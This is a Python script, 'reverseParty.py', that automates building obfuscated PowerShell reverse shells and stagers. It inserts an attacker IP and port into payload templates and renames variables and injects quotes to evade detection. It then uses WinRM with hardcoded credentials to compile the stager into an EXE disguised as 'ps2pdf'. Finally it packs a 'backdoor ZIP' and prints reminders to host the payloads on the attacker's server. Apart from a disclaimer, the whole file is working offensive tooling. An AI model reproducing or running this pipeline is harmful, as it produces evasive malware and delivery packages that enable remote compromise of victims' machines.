#!/usr/bin/env python3
"""
reverseParty.py - Reverse Shell Generation and Obfuscation Tool
================================================================
This script automates the creation of obfuscated reverse shells and stagers
for authorized penetration testing and red team operations.

DISCLAIMER: This tool is intended for authorized security testing only.
Unauthorized use against systems you do not own or have explicit permission
to test is illegal and unethical.

Directory structure expected:
  reverseParty/
  ├── reverseParty.py         (this script)
  └── engine/
      ├── powershell-cmd/
      │   ├── powershell-cmd.txt              (all PowerShell commands)
      │   └── powershell-cmd-noParametri.txt  (PS commands without params)
      ├── second-stage/        (clear-text reverse shell files)
      ├── stager/              (clear-text stager files)
      ├── out/                 (output - gets cleared each run)
      ├── stuff/               (support files: LAUNCHERNAME etc.)
      └── listener/            (listener scripts)

Dependencies:
    pip install pywinrm
"""

import os
import sys
import re
import uuid
import random
import shutil
import base64
import zipfile

# Optional WinRM dependency - imported lazily in step 4
try:
    import winrm
    WINRM_AVAILABLE = True
except ImportError:
    WINRM_AVAILABLE = False


# ==============================================================================
# VARIABLES — EDIT THESE BEFORE RUNNING THE SCRIPT
# ==============================================================================

LHOST        = "151.61.206.201"
LPORT        = "9001"
ATTACKER_URL = "http://151.61.206.201"
SECONDNAME   = "second.txt"
STAGERNAME   = "stager.txt"
LAUNCHERNAME = "launcher.bat"
EXENAME      = "'ps2pdf'.exe"
ZIPNAME      = "postscript.zip"
ISONAME      = "setup.iso"
WIN_IP       = "192.168.1.111"
WIN_USER     = "ieuser"
WIN_PASS     = "Passw0rd!"
TROJAN_FE    = "update_k897867.msu"
ICONNAME     = "adobe.ico"
TROJANNAME   = "installer.ps1"
TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"

# ==============================================================================
# END OF USER-CONFIGURABLE VARIABLES
# ==============================================================================


# --- ANSI color codes for terminal output ---
RED_DARK   = "\033[31m"
YELLOW     = "\033[33m"
GREEN      = "\033[32m"
GREEN_DARK = "\033[32m"
RESET      = "\033[0m"

# --- Path definitions (relative to the script location) ---
SCRIPT_DIR       = os.path.dirname(os.path.abspath(__file__))
ENGINE_DIR       = os.path.join(SCRIPT_DIR, "engine")
OUT_DIR          = os.path.join(ENGINE_DIR, "out")
SECOND_STAGE_DIR = os.path.join(ENGINE_DIR, "second-stage")
STAGER_DIR       = os.path.join(ENGINE_DIR, "stager")
STUFF_DIR        = os.path.join(ENGINE_DIR, "stuff")
LISTENER_DIR     = os.path.join(ENGINE_DIR, "listener")
PS_CMD_DIR       = os.path.join(ENGINE_DIR, "powershell-cmd")
PS_CMD_FILE      = os.path.join(PS_CMD_DIR, "powershell-cmd.txt")
PS_CMD_NOPARAM   = os.path.join(PS_CMD_DIR, "powershell-cmd-noParametri.txt")


# ==============================================================================
# UTILITY FUNCTIONS
# ==============================================================================

def banner():
    print("=" * 70)
    print("  reverseParty.py — Reverse Shell Obfuscation Tool")
    print("  For authorized penetration testing use only.")
    print("=" * 70)
    print()

def section(title: str):
    print()
    print("─" * 70)
    print(f"  {title}")
    print("─" * 70)

def info(msg: str):
    print(f"  [*] {msg}")

def ok(msg: str):
    print(f"  {GREEN}[+]{RESET} {msg}")

def warn(msg: str):
    print(f"  {YELLOW}[!]{RESET} {msg}")

def err(msg: str):
    print(f"  {RED_DARK}[ERROR] {msg}{RESET}")
    sys.exit(1)

def err_nonfatal(msg: str):
    print(f"  {RED_DARK}[ERROR] {msg}{RESET}")

def generate_hex_pool(count: int = 80) -> list:
    pool = []
    seen = set()
    while len(pool) < count:
        h = uuid.uuid4().hex
        if h not in seen:
            seen.add(h)
            pool.append(h)
    return pool

def read_file(path: str) -> str:
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        return f.read()

def write_file(path: str, content: str):
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)


# ==============================================================================
# OBFUSCATION — PASS 1: Variable renaming
# ==============================================================================

def obfuscate_variables(content: str, hex_pool: list, used_hex: set) -> tuple:
    pattern = re.compile(r'\$([A-Za-z_][A-Za-z0-9_]*)\s*=')
    var_names = set(pattern.findall(content))

    mapping = {}
    for var_name in sorted(var_names):
        available = [h for h in hex_pool if h not in used_hex]
        if not available:
            for h in generate_hex_pool(80):
                if h not in used_hex:
                    available.append(h)
        chosen = available[0]
        used_hex.add(chosen)
        mapping[var_name] = chosen

    for var_name, hex_name in mapping.items():
        content = re.sub(
            r'\$' + re.escape(var_name) + r'(?=[^A-Za-z0-9_]|$)',
            '$' + hex_name,
            content
        )

    return content, mapping


# ==============================================================================
# OBFUSCATION — PASS 2: PowerShell command quote injection (Method 1)
# ==============================================================================

def _insert_junk_between_chars(word: str) -> str:
    if len(word) <= 1:
        return word

    separators = ["''", '""']
    chars = list(word)
    max_insertions = len(chars) - 1
    n_insertions = random.randint(1, max_insertions)

    gap_indices = list(range(max_insertions))
    insert_positions = set(random.sample(gap_indices, n_insertions))

    result = [chars[0]]
    for i in range(len(chars) - 1):
        if i in insert_positions:
            result.append(random.choice(separators))
        result.append(chars[i + 1])

    return "".join(result)


def obfuscate_ps_commands(content: str, ps_cmd_file: str) -> str:
    if not os.path.isfile(ps_cmd_file):
        warn(f"PS command list not found: {ps_cmd_file} — skipping pass 2.")
        return content

    raw = read_file(ps_cmd_file).splitlines()
    commands = [c.strip() for c in raw if c.strip()]
    commands.sort(key=len, reverse=True)

    for cmd in commands:
        if cmd.startswith('.') or cmd.startswith(':') or cmd.startswith('('):
            continue

        pattern = re.compile(
            r'(?<![.\:\(\$A-Za-z0-9_])' + re.escape(cmd) + r'(?![A-Za-z0-9_])',
            re.IGNORECASE
        )

        def replacer(match):
            return _insert_junk_between_chars(match.group(0))

        content = pattern.sub(replacer, content)

    return content


# ==============================================================================
# OBFUSCATION PIPELINE
# ==============================================================================

def full_obfuscation_pipeline(content: str, label: str) -> str:
    hex_pool = generate_hex_pool(120)
    used_hex = set()

    info(f"  [{label}] Pass 1: Renaming user-defined variables with UUID hex tokens...")
    content, var_map = obfuscate_variables(content, hex_pool, used_hex)
    if var_map:
        ok(f"  [{label}] Renamed {len(var_map)} variable(s):")
        for orig, new in var_map.items():
            print(f"             ${orig}  →  ${new}")
    else:
        info(f"  [{label}] No assignable user-defined variables found.")

    info(f"  [{label}] Pass 2: Obfuscating PS command tokens (Method 1 — quote injection)...")
    before = content
    content = obfuscate_ps_commands(content, PS_CMD_FILE)
    if content != before:
        ok(f"  [{label}] PS command tokens obfuscated with '' / \"\" insertions.")
    else:
        info(f"  [{label}] No matching PS command tokens found for quote injection.")

    return content


# ==============================================================================
# STEP 1 — VARIABLE VALIDATION
# ==============================================================================

def step1_validate_variables():
    section("STEP 1 — Variable Validation")
    info("Checking that all required configuration variables are set...")
    info("The following values will be used during this run:")
    print()

    variables = {
        "LHOST":        LHOST,
        "LPORT":        LPORT,
        "ATTACKER_URL": ATTACKER_URL,
        "SECONDNAME":   SECONDNAME,
        "STAGERNAME":   STAGERNAME,
        "LAUNCHERNAME": LAUNCHERNAME,
        "EXENAME":      EXENAME,
        "ZIPNAME":      ZIPNAME,
        "ISONAME":      ISONAME,
        "WIN_IP":       WIN_IP,
        "WIN_USER":     WIN_USER,
        "WIN_PASS":     WIN_PASS,
        "TROJAN_FE":    TROJAN_FE,
        "ICONNAME":     ICONNAME,
        "TROJANNAME":   TROJANNAME,
        "TROJAN_URL":   TROJAN_URL,
    }

    all_ok = True
    max_len = max(len(k) for k in variables)

    for var_name, var_value in variables.items():
        padded = var_name.ljust(max_len)
        if not var_value or var_value.strip() == "":
            print(f"    {RED_DARK}{padded} = [NOT SET]  ← MISSING!{RESET}")
            all_ok = False
        else:
            print(f"    {padded} = {var_value}")

    print()
    if not all_ok:
        err("One or more required variables are not set. "
            "Please edit the variables section at the top of the script.")

    ok("All variables are set. Proceeding to Step 2...")


# ==============================================================================
# STEP 2 — SECOND STAGE OBFUSCATION
# ==============================================================================

def step2_obfuscate_second_stage():
    section("STEP 2 — Second Stage Obfuscation")

    info("Clearing output directory: " + OUT_DIR)
    if os.path.isdir(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR, exist_ok=True)
    ok("Output directory cleared and recreated successfully.")

    info("Scanning second-stage directory: " + SECOND_STAGE_DIR)
    if not os.path.isdir(SECOND_STAGE_DIR):
        err(f"Second-stage directory not found: {SECOND_STAGE_DIR}")

    stage_files = [
        f for f in os.listdir(SECOND_STAGE_DIR)
        if os.path.isfile(os.path.join(SECOND_STAGE_DIR, f))
    ]
    if not stage_files:
        err(f"No files found in second-stage directory: {SECOND_STAGE_DIR}")

    selected = random.choice(stage_files)
    selected_path = os.path.join(SECOND_STAGE_DIR, selected)
    ok(f"Randomly selected second-stage file: {selected}")

    dest_path = os.path.join(OUT_DIR, SECONDNAME)
    shutil.copy2(selected_path, dest_path)
    ok(f"Copied to output directory as: {dest_path}")

    info("Substituting placeholders [ATTACKER-IP] and [ATTACKER-PORT]...")
    content = read_file(dest_path)
    n_ip   = content.count("[ATTACKER-IP]")
    n_port = content.count("[ATTACKER-PORT]")
    content = content.replace("[ATTACKER-IP]",   LHOST)
    content = content.replace("[ATTACKER-PORT]", LPORT)
    write_file(dest_path, content)
    ok(f"Replaced {n_ip} occurrence(s) of [ATTACKER-IP]   → '{LHOST}'.")
    ok(f"Replaced {n_port} occurrence(s) of [ATTACKER-PORT] → '{LPORT}'.")

    info("Starting obfuscation pipeline (2 passes) on second-stage file...")
    content = read_file(dest_path)
    content = full_obfuscation_pipeline(content, label="second-stage")
    write_file(dest_path, content)
    ok(f"Second-stage obfuscation complete. Output: {dest_path}")


# ==============================================================================
# STEP 3 — STAGER OBFUSCATION
# ==============================================================================

def step3_obfuscate_stager():
    section("STEP 3 — Stager Obfuscation")

    info("Scanning stager directory: " + STAGER_DIR)
    if not os.path.isdir(STAGER_DIR):
        err(f"Stager directory not found: {STAGER_DIR}")

    stager_files = [
        f for f in os.listdir(STAGER_DIR)
        if os.path.isfile(os.path.join(STAGER_DIR, f))
    ]
    if not stager_files:
        err(f"No files found in stager directory: {STAGER_DIR}")

    selected = random.choice(stager_files)
    selected_path = os.path.join(STAGER_DIR, selected)
    ok(f"Randomly selected stager file: {selected}")

    dest_path = os.path.join(OUT_DIR, STAGERNAME)
    shutil.copy2(selected_path, dest_path)
    ok(f"Copied to output directory as: {dest_path}")

    info("Substituting placeholders [ATTACKER-URL] and [SECONDNAME]...")
    content = read_file(dest_path)
    n_url = content.count("[ATTACKER-URL]")
    n_sec = content.count("[SECONDNAME]")
    content = content.replace("[ATTACKER-URL]", ATTACKER_URL)
    content = content.replace("[SECONDNAME]",   SECONDNAME)
    write_file(dest_path, content)
    ok(f"Replaced {n_url} occurrence(s) of [ATTACKER-URL] → '{ATTACKER_URL}'.")
    ok(f"Replaced {n_sec} occurrence(s) of [SECONDNAME]   → '{SECONDNAME}'.")

    info("Starting obfuscation pipeline (2 passes) on stager file...")
    content = read_file(dest_path)
    content = full_obfuscation_pipeline(content, label="stager")
    write_file(dest_path, content)
    ok(f"Stager obfuscation complete. Output: {dest_path}")


# ==============================================================================
# STEP 4 — STAGER PS1 → EXE CONVERSION VIA WINRM
# ==============================================================================

def step4_convert_stager_to_exe():
    section("STEP 4 — Stager PS1 → EXE Conversion via WinRM")

    stager_local = os.path.join(OUT_DIR, STAGERNAME)
    exe_local    = os.path.join(OUT_DIR, EXENAME)

    if not WINRM_AVAILABLE:
        err_nonfatal(
            "The 'pywinrm' library is not installed. "
            "Run: pip install pywinrm\n"
            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    info(f"Connecting to Windows machine at {WIN_IP} via WinRM (user: {WIN_USER})...")
    try:
        session = winrm.Session(
            f"http://{WIN_IP}:5985/wsman",
            auth=(WIN_USER, WIN_PASS),
            transport="ntlm",
            read_timeout_sec=30,
            operation_timeout_sec=25,
        )
        result = session.run_ps("$env:COMPUTERNAME")
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        hostname = result.std_out.decode(errors="replace").strip()
        ok(f"Connected to Windows machine: {hostname} ({WIN_IP})")
    except Exception as e:
        err_nonfatal(
            f"Could not connect to {WIN_IP} via WinRM: {e}\n"
            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    info(f"Uploading {STAGERNAME} to Windows %TEMP% directory (chunked transfer)...")
    try:
        with open(stager_local, "rb") as f:
            file_bytes = f.read()
        b64_full  = base64.b64encode(file_bytes).decode("ascii")

        # Chunk size chosen to keep each WinRM command well below the
        # ~8 000-char command-line limit (conservative: 4 000 b64 chars ~ 3 KB raw).
        CHUNK_SIZE = 4000
        chunks     = [b64_full[i:i + CHUNK_SIZE]
                      for i in range(0, len(b64_full), CHUNK_SIZE)]
        remote_b64 = f"$env:TEMP\\{STAGERNAME}.b64"
        remote_dst = f"$env:TEMP\\{STAGERNAME}"

        info(f"  File size: {{len(file_bytes):,}} bytes  ->  "
             f"{{len(chunks)}} chunk(s) of up to {{CHUNK_SIZE}} b64 chars each.")

        # First chunk: create (overwrite) the temp b64 file on the remote host
        init_ps = (
            f"Set-Content -Path \"{remote_b64}\" "
            f"-Value \'{chunks[0]}\' -Encoding ASCII;\n"
            f"Write-Output \'Chunk 1 OK\'"
        )
        result = session.run_ps(init_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))

        # Remaining chunks: append to the temp b64 file
        for idx, chunk in enumerate(chunks[1:], start=2):
            append_ps = (
                f"Add-Content -Path \"{remote_b64}\" "
                f"-Value \'{chunk}\' -Encoding ASCII;\n"
                f"Write-Output \'Chunk {{idx}} OK\'"
            )
            result = session.run_ps(append_ps)
            if result.status_code != 0:
                raise RuntimeError(result.std_err.decode(errors="replace"))

        # Decode the assembled b64 file into the final PS1
        # Note: PowerShell backtick escapes (`r, `n) are passed as literal strings
        _bt_r = "`r"
        _bt_n = "`n"
        decode_ps = (
            f'$b64 = (Get-Content -Path "{remote_b64}" -Raw)'
            f' -replace "{_bt_r}",\'\' -replace "{_bt_n}",\'\';\n'
            f'$bytes = [System.Convert]::FromBase64String($b64);\n'
            f'[System.IO.File]::WriteAllBytes("{remote_dst}", $bytes);\n'
            f'Remove-Item "{remote_b64}" -Force -EA 0;\n'
            f"Write-Output 'Decode OK'"
        )
        result = session.run_ps(decode_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))

        ok(f"File {STAGERNAME} uploaded to remote %TEMP% successfully "
           f"({{len(chunks)}} chunk(s)).")
    except Exception as e:
        err_nonfatal(
            f"Failed to upload {STAGERNAME} to {WIN_IP}: {e}\n"
            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return


    info(f"Running Invoke-ps2exe: {STAGERNAME} → {EXENAME}...")
    try:
        convert_ps = (
            f"Invoke-ps2exe \"$env:TEMP\\{STAGERNAME}\" \"$env:TEMP\\{EXENAME}\";\n"
            f"if (Test-Path \"$env:TEMP\\{EXENAME}\") "
            f"{{ Write-Output 'Conversion OK' }} "
            f"else {{ Write-Error 'EXE not created' }}"
        )
        result = session.run_ps(convert_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        ok(f"Invoke-ps2exe completed. Remote EXE: %TEMP%\\{EXENAME}")
    except Exception as e:
        err_nonfatal(
            f"ps2exe conversion failed on {WIN_IP}: {e}\n"
            f"  {RED_DARK}Ensure ps2exe is installed on the Windows machine "
            f"(Install-Module ps2exe).\n"
            f"  The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        session.run_ps(f"Remove-Item \"$env:TEMP\\{STAGERNAME}\" -Force -EA 0")
        return

    info(f"Downloading {EXENAME} from Windows %TEMP% to local out/...")
    try:
        download_ps = (
            f"$bytes = [System.IO.File]::ReadAllBytes(\"$env:TEMP\\{EXENAME}\");\n"
            f"[System.Convert]::ToBase64String($bytes)"
        )
        result = session.run_ps(download_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        b64_exe   = result.std_out.decode(errors="replace").strip()
        exe_bytes = base64.b64decode(b64_exe)
        with open(exe_local, "wb") as f:
            f.write(exe_bytes)
        ok(f"EXE downloaded: {exe_local} ({len(exe_bytes):,} bytes)")
    except Exception as e:
        err_nonfatal(
            f"Failed to download {EXENAME} from {WIN_IP}: {e}\n"
            f"  {RED_DARK}The stager EXE will NOT be available locally. "
            f"Continuing...{RESET}"
        )

    info("Cleaning up temporary files from Windows %TEMP%...")
    try:
        cleanup_ps = (
            f"Remove-Item \"$env:TEMP\\{STAGERNAME}\" -Force -EA 0;\n"
            f"Remove-Item \"$env:TEMP\\{EXENAME}\" -Force -EA 0;\n"
            f"Write-Output 'Cleanup OK'"
        )
        session.run_ps(cleanup_ps)
        ok("Remote temporary files cleaned up.")
    except Exception:
        warn("Could not clean up temporary files on the Windows machine.")


# ==============================================================================
# STEP 5 — ZIP CREATION (LAUNCHER + STAGER EXE)
# ==============================================================================

def step5_create_zip():
    """
    STEP 5: Create the backdoor ZIP archive containing the launcher and stager EXE.

    Actions performed:
      5a. Verify that the stager EXE (EXENAME) exists in out/.
          If missing → dark-red error, skip step.
      5b. Verify that the launcher file (LAUNCHERNAME) exists in stuff/.
          If missing → dark-red error, skip step.
      5c. Create ZIPNAME inside out/, adding:
            - EXENAME      (the compiled stager EXE from out/)
            - LAUNCHERNAME (from stuff/)
          Both files are stored at the root of the ZIP (no directory prefix).
      5d. On success, print the green deployment reminders for the operator.
    """
    section("STEP 5 — ZIP Creation (Launcher + Stager EXE)")

    exe_local      = os.path.join(OUT_DIR, EXENAME)
    launcher_local = os.path.join(STUFF_DIR, LAUNCHERNAME)
    zip_local      = os.path.join(OUT_DIR, ZIPNAME)

    # 5a. Check stager EXE
    if not os.path.isfile(exe_local):
        err_nonfatal(
            f"Stager EXE not found: {exe_local}\n"
            f"  {RED_DARK}Ensure Step 4 completed successfully. "
            f"ZIP will NOT be created. Continuing...{RESET}"
        )
        return

    # 5b. Check launcher file
    if not os.path.isfile(launcher_local):
        err_nonfatal(
            f"Launcher file not found: {launcher_local}\n"
            f"  {RED_DARK}Ensure '{LAUNCHERNAME}' exists inside the stuff/ directory. "
            f"ZIP will NOT be created. Continuing...{RESET}"
        )
        return

    # 5c. Create ZIP with EXENAME and LAUNCHERNAME at archive root
    info(f"Creating ZIP archive: {zip_local}")
    info(f"  Adding: {EXENAME}       (from out/)")
    info(f"  Adding: {LAUNCHERNAME}  (from stuff/)")
    try:
        with zipfile.ZipFile(zip_local, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.write(exe_local,      arcname=EXENAME)
            zf.write(launcher_local, arcname=LAUNCHERNAME)
        zip_size = os.path.getsize(zip_local)
        ok(f"ZIP archive created successfully: {zip_local} ({zip_size:,} bytes)")
    except Exception as e:
        err_nonfatal(
            f"Failed to create ZIP archive: {e}\n"
            f"  {RED_DARK}ZIP will NOT be available. Continuing...{RESET}"
        )
        return

    # 5d. Deployment reminders
    print()
    print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
    print(f"  {GREEN_DARK}  DEPLOYMENT REMINDERS:{RESET}")
    print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
    print(f"  {GREEN_DARK}  ** Copy {SECONDNAME} on {ATTACKER_URL}{RESET}")
    print(f"  {GREEN_DARK}     and activate a web server to download it {RESET}")
    print(f"  {GREEN_DARK}  ** Copy {ZIPNAME} on {ATTACKER_URL}{RESET}")
    print(f"  {GREEN_DARK}     and activate a web server to download it{RESET}")
    print(f"  {GREEN_DARK}  ** Activates the correct listener (TCP, TLS etc) depending on the selected second stage {RESET}")
    print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
    print()


# ==============================================================================
# MAIN
# ==============================================================================

def main():
    banner()
    step1_validate_variables()
    step2_obfuscate_second_stage()
    step3_obfuscate_stager()
    step4_convert_stager_to_exe()
    step5_create_zip()

    section("ALL STEPS COMPLETED")
    ok("reverseParty.py finished successfully.")
    print()
    info(f"Output directory : {OUT_DIR}")
    info(f"Second stage     : {os.path.join(OUT_DIR, SECONDNAME)}")
    info(f"Stager (PS1)     : {os.path.join(OUT_DIR, STAGERNAME)}")
    exe_path = os.path.join(OUT_DIR, EXENAME)
    if os.path.isfile(exe_path):
        info(f"Stager (EXE)     : {exe_path}")
    else:
        warn(f"Stager (EXE)     : not generated (see Step 4 output above)")
    zip_path = os.path.join(OUT_DIR, ZIPNAME)
    if os.path.isfile(zip_path):
        info(f"Backdoor ZIP     : {zip_path}")
    else:
        warn(f"Backdoor ZIP     : not generated (see Step 5 output above)")
    print()


if __name__ == "__main__":
    main()
